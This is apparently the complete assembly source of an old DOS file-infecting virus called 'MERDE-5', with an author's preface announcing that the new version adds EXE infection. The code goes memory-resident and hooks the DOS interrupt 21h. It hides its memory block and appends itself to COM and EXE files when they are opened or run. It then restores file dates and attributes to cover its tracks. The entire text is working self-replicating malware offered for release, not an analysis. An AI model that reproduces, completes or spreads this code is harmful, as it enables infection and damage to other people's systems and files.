; Okay, here is my newest version..  It now 
; offers EXE infection.  I messed up command.com
; compatibility so this version won't infect it.
; Also, this version might be a little shakey,
; but it should work okay with most setups
; (I'm not professional yet, so screw 'em
; if this hangs!)..
; This will be the last time I release code for
; my virii.  Thanks to firststrike, and anyone else
; who has given me tips.....
;  Be careful not to get this, it is kinda hard to get rid
;  of (it would be REALLY hard to get rid of if it infected
;command.com- I will have to fix that (along with the TERRIBLE
; inefficiency in my interrupt handler (the loader is OKAY, but
; My_21 is just kind of a jumble of code thrown together for now.
; If you want to vaccinate your system, and you know a little about
; assembler, it isn't that hard. (I gave the come version to
; myself about 3 times).  Just take notice of my use of interrupt
; 71...(This will be changed in future versions, for obvious reasons).
;	MERDE-5 The merde virus version 5.0-			loki


compare_val	equ	850
interrupt	equ	21h
Code_seg	Segment Byte
	Assume DS:Code_seg, CS:Code_seg
	ORG 100h

start:	call	get_ip

exe_or_com:
	dw	'CO'
get_ip:
	pop	di
	sub	di,3
	cmp	word ptr cs:[di+3],'EX'
	jne	com_memory_loader
	jmp	exe_memory_loader

;Load memory from within an EXE file..
;------------------------------------------------------------------------------		
exe_memory_loader:
	call	check_for_int_71
	jc	go
	call	get_memory	;es=my_segment
	jnc	aaaa
	jmp	exit_exe
aaaa:
	call	hide_memory
	call	set_int_71
	call	save_21
	push	ds
	call	move_all_code
	pop	ds
	mov	bx,es
	call	set_21
go:	jmp	exit_exe

;------------------------------------------------------------------------------
;******************************************************************************
;------------------------------------------------------------------------------
;load memory from a COM file...

com_memory_loader:
	call	restore_com
	call	check_for_int_71
	jc	go_1
	call	get_memory
	jnc	bbbb
	jmp	exit_com
	
bbbb:	call	hide_memory

reset_di:
	call	set_int_71
	call	save_21
	call	move_all_code
	mov	bx,es
	call	set_21
go_1:	jmp	exit_com

;------------------------------------------------------------------------------
;Returns ES with my segment (or an error)
;------------------------------------------------------------------------------
get_memory:
	int	12h
	mov	bx,cs
	mov	cx,1024
	mul	cx	
	clc
	mov	cx,600h			;Amount of needed memory
	sub	ax,cx
	sbb	dx,0000			;dx:ax=where we want this mem to end!
	mov	bx,dx
	mov	bp,ax			;save this...
	mov	cx,cs
	mov	ax,0010h
	mul	cx
	clc
	mov	cx,di
	add	cx,offset ending-100h
	add	ax,cx
	adc	dx,0000
	clc
	sub	bp,ax
	sbb	bx,dx
	clc
	mov	ax,bp
	mov	dx,bx
	mov	cx,0010h
	div	cx		;dx:ax=memory above this-divide it by 16
	mov	bx,ax
	mov	ah,4ah
	int	21h
	jc	get_memory_error
	mov	bx,60
	mov	ah,48h
	int	21h
	jc	get_memory_error
	mov	es,ax
	clc
	ret
get_memory_error:
	stc
	ret
;------------------------------------------------------------------------------
;Moves all code + PSP to my secretive little segment-destroys DS (in EXE files)
;------------------------------------------------------------------------------
move_all_code:
;move PSP**************************
	push	di
	xor	si,si
	xor	di,di
	mov	cx,100h
	rep	movsb
;**********************************
;move my code**********************
	pop	si
	push	si
	push	cs
	pop	ds
	mov	cx,offset ending-100h
	rep	movsb
	pop	di
	ret
;**********************************	
;------------------------------------------------------------------------------
;------------------------------------------------------------------------------
;saves interrupt 21 in cs:[int_21_saveo]
save_21:
	push	es
	xor	ax,ax
	mov	es,ax
	mov	ax,es:[interrupt*4]
	mov	bx,es:[interrupt*4+2]
	mov	cs:[di+offset int_21_saveo-100h],ax
	mov	cs:[di+offset int_21_saves-100h],bx
	pop	es
	ret

;-----------------------------------------------------------------------------
;sets interrupt 21 to bx:offset of my_21
set_21:
	push	es
	xor	ax,ax
	mov	es,ax
	mov	es:[interrupt*4],offset my_21
	mov	es:[interrupt*4+2],bx
	pop	es
	ret
;-----------------------------------------------------------------------------
;-----------------------------------------------------------------------------
;Restores a COM file
restore_com:
	push	di
	mov	si,di
	add	si,offset three_bytes-100h
	mov	di,0100h
	mov	cx,3
	rep	movsb
	pop	di
	ret
;------------------------------------------------------------------------------
;Hides my segment's (es) size and owner
hide_memory:
	push	ds
	xor	cx,cx
	mov	ds,cx
	mov	cx,ds:[2eh*4+2]
	pop	ds
	push	ds
	mov	dx,es
	dec	dx
	mov	ds,dx
	mov	ds:[1],cx			;maybe later set to DOS seg
	mov	byte ptr ds:[0],'Z'
	mov	word ptr ds:[3],0000
	mov	es:[16h],cx
	mov	es:[0ah],cx
	mov	es:[0ch],cx
	pop	ds
	ret
;------------------------------------------------------------------------------

;check_for_int 71-  My little multiplex interrupt
check_for_int_71:
	int	71h
	cmp	ax,9999h
	je	set_c
	clc
	ret
set_c:
	stc
	ret
;------------------------------------------------------------------------------

;Set interrupt 71:
set_int_71:
	push	ds
	xor	ax,ax
	mov	ds,ax
	mov	ds:[71h*4+2],es
	mov	ds:[71h*4],offset my_71
	pop	ds
	ret


exit_com:
	xor	cx,cx
	xor	dx,dx
	xor	ax,ax
	xor	bx,bx
	xor	si,si
	xor	di,di
	mov	ax,100h
	jmp	ax

exit_exe:
	push	ds
	pop	es
	mov	ax,es
	add	ax,10h
	add	word ptr cs:[di+offset orig_cs-100h],ax
	cli
	add	ax,word ptr cs:[di+offset orig_ss-100h]
	mov	ss,ax
	mov	sp,word ptr cs:[di+offset orig_sp-100h]
	sti
	jmp	dword ptr cs:[di+offset orig_ip-100h]

;------------------------------------------------------------------
my_21:	
	cmp	ah,4bh
	je	okay_go
	cmp	ah,0fh
	je	okay_go
	cmp	ah,3dh
	je	okay_go
	cmp	ah,43h
	je	okay_go
	jmp	continue_21
okay_go:
	push	ax
	push	bx
	push	cx
	push	dx
	push	es
	push	di
	push	si
	push	bp
	push	es
	push	ds
check_for_com:
	xor	si,si
	mov	bx,dx
looper:
	cmp	word ptr ds:[bx+si],'c.'
	je	check_om
	cmp	word ptr ds:[bx+si],'C.'
	je	check_om
	cmp	word ptr ds:[bx+si],'e.'
	je	check_ex
	cmp	word ptr ds:[bx+si],'E.'
	je	check_ex
	inc	si
	cmp	si,40
	jne	looper
	jmp	give_up1
check_om:
	cmp	word ptr ds:[bx+si+2],'mo'
	jne	bb
	mov	cs:[com_or_exe],0
	jmp	check_for_infection
bb:	cmp	word ptr ds:[bx+si+2],'MO'
	jne	cc
	mov	cs:[com_or_exe],0
	jmp	check_for_infection
cc:	jmp	give_up1	
check_ex:
	cmp	word ptr ds:[bx+si+2],'ex'
	jne	label1
	mov	cs:[com_or_exe],1234h
	jmp	okay_do
label1:
	cmp	word ptr ds:[bx+si+2],'EX'		;FIX ME!!!!!!!
	je	cccc				;forget exe for now..
	jmp	give_up1
cccc:
	mov	cs:[com_or_exe],1234h
	jmp	okay_do
check_for_infection:
	cmp	word ptr [bx+si-2],'DN'
	jne	okey_k
	jmp	give_up1
okey_k:
	cmp	word ptr [bx+si-2],'DN'
	jne	okay_do
	jmp	give_up1
okay_do:
	mov	cs:[storage_1],ds
	mov	cs:[storage_2],dx
	mov	ah,50h		;set PSP to ours
	push	cs
	pop	bx
	call	dos_21
	mov	ah,43h
	xor	al,al
	call	dos_21
	jnc	okay9
	jmp	give_up
okay9:	mov	cs:[attrib],cx
	mov	ah,43h
	mov	al,1
	xor	cx,cx
	call	dos_21
	mov	ah,3dh
	mov	al,2
	call	dos_21
	jnc	okay10
	jmp	give_up
okay10:	mov	cs:[handle],ax
	mov	bx,ax
	mov	ah,57h
	xor	al,al
	call	dos_21
	mov	cs:[date],dx
	mov	cs:[time],cx
	mov	ax,4202h
	xor	dx,dx
	xor	cx,cx
	call	dos_21
	jnc	okay11
	jmp	give_up
okay11:	mov	cs:[file_size],ax
	cmp	cs:[com_or_exe],1234h
	jne	okey_p
	sub	ax,compare_val
	sbb	dx,0000
	mov	cx,dx
	mov	dx,ax
	jmp	contin2
okey_p:	xor	cx,cx
	cmp	ax,63000
	jb	contin1
	call	reset_all
	jmp	give_up
contin1:
	cmp	ax,600
	jnb	continx
	call	reset_all
	jmp	give_up
continx:
	sub	ax,compare_val
	mov	dx,ax
	xor	cx,cx
contin2:
	mov	ax,4200h
	mov	bx,cs:[handle]
	call	dos_21
	mov	ah,3fh
	push	cs
	pop	ds
	mov	dx,offset buffer
	mov	cx,2
	call	dos_21
	mov	ax,word ptr cs:[buffer]
	mov	bx,word ptr cs:[offset dont_write-compare_val]
	cmp	ax,bx
	jne	dddd
	jmp	give_up
dddd:
	cmp	cs:[com_or_exe],1234h
	je	infect_exe
	jmp	infect_com

infect_exe:
	mov	bx,cs:[handle]
	xor	dx,dx
	xor	cx,cx
	mov	ax,4200h
	call	dos_21
	push	cs
	pop	ds
	mov	ah,3fh
	mov	cx,18h
	mov	dx,offset header
	call	dos_21
	cmp	word ptr [header+8],1000h
	jb	okayh
	call	reset_all
	jmp	give_up
okayh:	mov	ax,word ptr [header+16h]
	mov	orig_cs,ax
	mov	ax,word ptr [header+14h]
	mov	orig_ip,ax
	mov	ax,word ptr [header+0eh]
	mov	orig_ss,ax
	mov	ax,word ptr [header+10h]
	mov	orig_sp,ax
	mov	ax,4202h
	mov	bx,handle
	xor	cx,cx
	xor	dx,dx
	call	dos_21
	mov	word ptr ds:[exe_or_com],'EX'
	mov	high_size,dx
	mov	low_size,ax
	mov	real_hsize,dx
	mov	real_lsize,ax
	mov	ax,word ptr [header+8]
	mov	cx,10h
	mul	cx
	clc
	sub	low_size,ax		;high_size:low_size=load size
	sbb	high_size,dx
	clc
	mov	dx,high_size
	mov	ax,low_size
	mov	cx,0010h
	div	cx
	cmp	dx,0
	je	okay
	mov	cx,16
	sub	cx,dx
	mov	bp,cx
	add	real_lsize,bp
	adc	real_hsize,0000
	clc
	stc
	adc	ax,0000
	jmp	okay1
okay:	xor	bp,bp
okay1:	xor	dx,dx
	mov	word ptr [header+16h],ax
	;add to dx?
	mov	word ptr [header+14h],dx
	mov	word ptr [header+0eh],ax
	mov	dx,0fffeh
	mov	word ptr [header+10h],dx
	mov	dx,real_hsize
	mov	ax,real_lsize
	add	ax,offset ending-100h+1
	adc	dx,0000
	push	ax
	mov	cl,9
	shr	ax,cl
	ror	dx,cl
	stc
	adc	dx,ax
	pop	ax
	and	ah,1
	mov	word ptr [header+4],dx
	mov	word ptr [header+2],ax	
	mov	ah,40h
	mov	bx,handle
	mov	cx,offset dont_write-100h
	add	cx,bp
	mov	dx,100h
	sub	dx,bp
	call	dos_21
	mov	ax,4200h
	xor	cx,cx
	xor	dx,dx
	mov	bx,handle
	call	dos_21
	mov	ah,40h
	mov	bx,handle
	mov	cx,18h
	mov	dx,offset header
	call	dos_21
	call	reset_all
	jmp	give_up

infect_com:
	xor	cx,cx
	xor	dx,dx
	mov	bx,cs:[handle]
	mov	ax,4200h
	call	dos_21
	mov	ah,3fh
	mov	cx,3
	push	cs
	pop	ds
	mov	dx,offset three_bytes
	call	dos_21
	mov	ax,cs:[file_size]
	sub	ax,3
	mov	word ptr cs:[jumper+1],ax
	mov	word ptr cs:[exe_or_com],'CO'
	call	write_to_end
	xor	cx,cx
	xor	dx,dx
	mov	ax,4200h
	mov	bx,cs:[handle]
	call	dos_21
	mov	dx,offset jumper
	mov	ah,40h
	mov	cx,3
	call	dos_21
	call	reset_all
give_up:
	mov	ah,50h
	mov	bx,cs:[storage_1]
	call	dos_21
give_up1:
	pop	ds
	pop	es
	pop	bp
	pop	si
	pop	di
	pop	es
	pop	dx
	pop	cx
	pop	bx
	pop	ax
	jmp	continue_21
continue_21:
	jmp	dword ptr cs:[int_21_saveo]
dos_21:
	pushf
	call	dword ptr cs:[int_21_saveo]
	ret

reset_all:
	mov	bx,cs:[handle]
	mov	cx,cs:[time]
	mov	dx,cs:[date]
	mov	ax,5701h
	call	dos_21
	mov	ah,3eh
	mov	bx,cs:[handle]
	call	dos_21
	mov	ah,43h
	mov	al,1
	mov	cx,cs:[attrib]
	mov	ds,cs:[storage_1]
	mov	dx,cs:[storage_2]
	call	dos_21
	ret	

write_to_end:
	
	mov	ax,4202h
	xor	dx,dx
	xor	cx,cx
	mov	bx,cs:[handle]
	call	dos_21
	mov	ah,40h
	mov	cx,offset dont_write-100h
	push	cs
	pop	ds
	mov	dx,0100h
	call	dos_21
	ret
my_71:
	mov	ax,9999h
	iret


jumper:
	db	0e9h,00,00
storage_1	dw	0000
storage_2	dw	0000
int_21_saveo	dw	0000
int_21_saves	dw	0000
three_bytes:	db	0cdh,20h,90h
db	'Loki'
orig_ip		dw	0000
orig_cs		dw	0000
orig_ss		dw	0000
orig_sp		dw	0000
dont_write:

header:
		db 24 dup(00)
com_or_exe	dw	1234h
handle		dw	0000
file_size	dw	0000
attrib		dw	0000
date		dw	0000
time		dw	0000
buffer:		dw	0000
loader_high	dw	0000
loader_low	dw	0000
header_cs	dw	0000
header_ip	dw	0000
low_size	dw	0000
high_size	dw	0000
real_hsize	dw	0000
real_lsize	dw	0000
ending:
Code_seg 	ENDS
END	start